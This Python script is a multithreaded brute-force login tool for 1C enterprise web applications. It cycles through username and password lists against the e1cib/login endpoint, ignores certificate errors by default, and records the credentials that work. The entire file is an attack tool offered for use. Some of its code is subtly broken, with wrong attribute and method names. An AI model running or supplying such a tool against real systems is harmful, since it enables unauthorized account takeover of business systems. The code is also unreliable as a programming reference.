#!/usr/bin/env python

from time import sleep, strftime
import sys
import argparse
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict
import requests
import urllib3
import dataclasses
import logging

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.DEBUG)


def parse_args() -> argparse:
    parser = argparse.ArgumentParser(
        description='Web Application Bruteforcer',
        epilog='Example: py ./1c_brute.py <url> users.txt pass.txt'
        )

    parser.add_argument(
        'Target',
        metavar='target',
        type=str,
        help="The target URI with directory of 1C webapp."
        "Example: http://192.168.1.1/docCorp"
    )

    parser.add_argument(
        'Username',
        metavar='users',
        type=str,
        help='The usernames list'
    )

    parser.add_argument(
        'Passwords',
        metavar='passwords',
        type=str,
        help='The passwords list'
    )

    parser.add_argument(
        "--delay",
        type=int,
        help='Time in milliseconds between each request',
        default=5
    )

    parser.add_argument(
        "--startat",
        type=int,
        help='Start at this line in the file',
        default=0
    )

    parser.add_argument(
        "--ignore-invalid-certificate",
        action='store_true',
        help='Ignore untrusted certs',
        default=True
    )

    parser.add_argument(
        "--check-empty-passwords",
        action="store_true",
        help="Check for users with empty passwords",
        default=False
    )

    parser.add_argument(
        "--save-results",
        action="store_true",
        help="Save results to file 'results.txt'",
        default=False
    )

    args = parser.parse_args()

    return args


@dataclasses.dataclass()
class ExploitConfig(object):
    """
    """
    clnId: str = "84c3db7e-661b-9350-57ac-7164384e6c43"
    lang: str = "ru_RU"
    version: str = "8.3.18.1208"
    startAt: int = 0

    target: str = ""
    usernames_file: str = "users.txt"
    passwords_file: str = "pass.txt"
    threads: int = 10
    delay: int = 5
    ignoreBadCerts: bool = False
    check_empty_passwords: bool = False

    reseturl: str = ""
    resetdata = {"root": "{}"}

    def __init__(
        self,
        target: str,
        usernames_file: str,
        passwords_file: str,
        startAt: int,
        delay: int,
        ignoreBadCerts: bool,
        check_empty_passwords: bool,
        version: str
    ):
        self.target = target
        self.usernames_file = usernames_file
        self.passwords_file = passwords_file
        self.startAt = startAt
        self.delay = delay
        self.ignoreBadCerts = ignoreBadCerts
        self.check_empty_passwords = check_empty_passwords
        self.version = version

        self.reseturl = f"{target}/{self.lang}/e1cib/logout"


class FileHandler(object):
    """
    Class for managing operations with text files
    """

    @staticmethod
    def load(filename: str) -> List[str]:
        """

        :param filename: _description_
        :type filename: str
        :return: _description_
        :rtype: List[str]
        """
        data: List[str] = []
        try:
            with open(filename, "r", encoding="UTF8") as file:
                data = file.readlines()

            logger.info(f"Data successfully loaded from '{filename}'")
        except IOError as e:
            logger.exception(
                f"Failed to load data from file '{filename}': {e}"
            )

        return data

    @staticmethod
    def save_line(filename: str, data: str):
        """

        :param filename: _description_
        :type filename: str
        :param data: _description_
        :type data: str
        """
        try:
            with open(filename, "a", encoding="UTF8") as file:
                file.write(f"{data}\n")

            logger.info(f"Data successfully saved to {filename}")
        except IOError as e:
            logger.exception(f"Failed to save data to file {filename}: {e}")


class Exploit(object):
    """
    """
    _config: ExploitConfig = None
    found_credentials: List[str] = []

    def __init__(
        self,
        target: str,
        usernames_file: str,
        passwords_file: str,
        startAt: int,
        delay: int,
        ignoreBadCerts: bool,
        check_empty_passwords: bool
    ):
        version = self._determine_version()

        self._config = ExploitConfig(
            target=target,
            usernames_file=usernames_file,
            passwords_file=passwords_file,
            startAt=startAt,
            delay=delay,
            ignoreBadCerts=ignoreBadCerts,
            check_empty_passwords=check_empty_passwords,
            version=version
        )

    def _prepare_cred(self, login: str, password: str = None) -> str:
        if self.config.check_empty_passwords:
            login += ""
            return base64.b64encode(
                f'{login}'.encode('utf-8')
            ).decode('utf-8')

        return base64.b64encode(
            f'{login}:{password}'.encode('utf-8')
        ).decode('utf-8')

    def _determine_version(self) -> str:
        return "8.3.18.1208"

    def _brute(self, login, password):
        """

        :param login: _description_
        :type login: _type_
        :param password: _description_
        :type password: _type_
        """
        cred = self._prepare_cred(login, password)
        url = f"{self._config.target}/{self._config.lang}/e1cib/login?version={self._config.version}&cred={cred}&vl={self._config.lang}&clnId={self._config.clnId}"  # noqa
        try:
            http = requests.post(url, verify=not self._config.ignoreBadCerts)
            logger.debug(
                f"[{http.status_code}], {login}:{password}"
            )
            match http.status_code:
                case 200:
                    logging.info(
                        f"\033[92m[+] Success: {login}:{password}\033[0m"
                    )
                    self.found_credentials.append(f"{login}:{password}")
                    cookie = http.headers.get('Set-Cookie', '').split(';')[0]
                    if cookie:
                        resetheader = {'Cookie': cookie}
                        requests.post(
                            self._config.reseturl,
                            headers=resetheader,
                            json=self._config.resetdata,
                            verify=not self._config.ignoreBadCerts
                        )
                    if self._config.save_results:
                        FileHandler.save(
                            filename="results.txt",
                            data=f"{login}:{password}\n"
                        )
                case 400:
                    logging.error(
                        "No free license for new user's session. Try later."
                    )
                    sys.exit(0)

            sleep(self._config.delay)

        except requests.exceptions.RequestException as e:
            logging.exception(f"[!] Error: {e}")
            pass

    def start_exploit(self):
        users = FileHandler.load(
            filename=self._config.usernames_file
        )[self._config.startAt:]
        if not users:
            logging.error(
                "[!] There is no users provided. Shutting down..."
            )
            sys.exit(0)

        passwords = []
        if not self._config.check_empty_passwords:
            passwords = FileHandler.load(filename=self._config.passwords_file)

        logger.info(
            f"Number of users: {len(users)}"
        )
        logger.info(
            f"Number of passwords: {len(passwords)}"
        )

        with ThreadPoolExecutor(max_workers=self._config.threads) as executor:
            futures = [
                executor.submit(self._brute, user, password)
                for user
                in users
                for password
                in passwords
            ]
            try:
                for future in as_completed(futures):
                    future.result()
            except KeyboardInterrupt:
                logging.info("\n[!] Interrupted by user. Shutting down...")
                executor.shutdown(wait=False)
                for future in futures:
                    future.cancel()
                raise

        return self.found_credentials


def main():
    args = parse_args()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    exploit = Exploit(
        target=args.Target,
        usernames_file=args.Username,
        passwords_file=args.Passwords,
        startAt=args.startat,
        delay=args.delay / 1000,
        ignoreBadCerts=args.ignore_invalid_certificate,
        check_empty_passwords=args.check_empty_passwords
    )

    logging.info(
        "\033[94mBruteforce started at " + strftime("%d-%m-%Y %H:%M:%S %Z") + "\033[0m\n"  # noqa
    )
    found_credentials = exploit.start_exploit()

    logging.info(
        "\n\033[94mBruteforce completed at " + strftime("%d-%m-%Y %H:%M:%S %Z") + "\033[0m"  # noqa
    )
    logging.info(
        f"\033[94mFound \033[93m\033[1m{len(found_credentials)}\033[0m \033[94mpassword(s).\033[0m"  # noqa
    )

    if found_credentials:
        logging.info("\033[94mCredentials found:\033[0m")
        for cred in found_credentials:
            logging.info(f"\033[92m{cred}\033[0m")


if __name__ == "__main__":
    main()
